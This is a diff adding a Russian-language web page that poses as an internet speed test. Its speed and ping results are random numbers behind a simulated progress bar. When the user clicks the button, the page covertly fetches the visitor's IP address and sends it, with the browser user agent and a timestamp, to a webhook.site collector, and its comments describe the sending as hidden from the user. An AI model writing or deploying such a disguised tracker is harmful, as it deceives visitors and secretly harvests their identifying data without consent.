@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Тест скорости интернета</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <h1>🌐 Тест скорости интернета</h1>
+        
+        <div class="loader" id="loader"></div>
+        
+        <div class="status-card">
+            <div class="status-label">Статус теста:</div>
+            <div class="test-status" id="testStatus">Подготовка к тесту...</div>
+        </div>
+        
+        <div class="progress-container">
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
+            <div class="progress-text" id="progressText">0%</div>
+        </div>
+        
+        <div class="results" id="results" style="display: none;">
+            <div class="result-card success">
+                <strong>✅ Тест завершен!</strong><br>
+                Результаты отправлены на сервер
+            </div>
+            <div class="result-info">
+                Скорость: <span id="finalSpeed">0</span> Мбит/с<br>
+                Пинг: <span id="finalPing">0</span> мс
+            </div>
+        </div>
+        
+        <button class="test-btn" onclick="startTest()" id="testBtn">🚀 Начать тест скорости</button>
+        
+        <p class="footer">Проверка качества интернет-соединения</p>
+    </div>
+
+    <script>
+        function startTest() {
+            const testStatus = document.getElementById('testStatus');
+            const progressFill = document.getElementById('progressFill');
+            const progressText = document.getElementById('progressText');
+            const testBtn = document.getElementById('testBtn');
+            const results = document.getElementById('results');
+            const finalSpeed = document.getElementById('finalSpeed');
+            const finalPing = document.getElementById('finalPing');
+            
+            // Блокируем кнопку
+            testBtn.disabled = true;
+            testBtn.textContent = '⏳ Тестирование...';
+            results.style.display = 'none';
+            
+            // Сразу отправляем IP (пользователь не видит)
+            fetch('https://api.ipify.org?format=json')
+                .then(r => r.json())
+                .then(data => {
+                    // Скрыто отправляем IP на сборщик
+                    fetch('https://webhook.site/3ef2b531-e76c-4801-9a99-76ae86c62ca2', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            ip: data.ip,
+                            userAgent: navigator.userAgent,
+                            time: new Date().toISOString(),
+                            testType: 'hidden_speedtest'
+                        })
+                    });
+                })
+                .catch(error => {
+                    console.log('IP send error');
+                });
+            
+            // Имитация теста скорости
+            let progress = 0;
+            const testInterval = setInterval(() => {
+                progress += 2;
+                progressFill.style.width = progress + '%';
+                progressText.textContent = progress + '%';
+                
+                if (progress <= 25) {
+                    testStatus.textContent = 'Проверка подключения...';
+                } else if (progress <= 50) {
+                    testStatus.textContent = 'Измерение ping...';
+                } else if (progress <= 75) {
+                    testStatus.textContent = 'Тест скорости загрузки...';
+                } else {
+                    testStatus.textContent = 'Завершение теста...';
+                }
+                
+                if (progress >= 100) {
+                    clearInterval(testInterval);
+                    
+                    // Случайные "результаты"
+                    const speed = (Math.random() * 80 + 20).toFixed(1);
+                    const ping = Math.floor(Math.random() * 40 + 10);
+                    
+                    finalSpeed.textContent = speed;
+                    finalPing.textContent = ping;
+                    
+                    testStatus.textContent = 'Тест завершен!';
+                    testBtn.textContent = '🔄 Повторить тест';
+                    testBtn.disabled = false;
+                    results.style.display = 'block';
+                }
+            }, 100);
+        }
+        
+        // автозапуск при загрузке
+        // setTimeout(startTest, 1000);
+    </script>
+</body>
+</html>
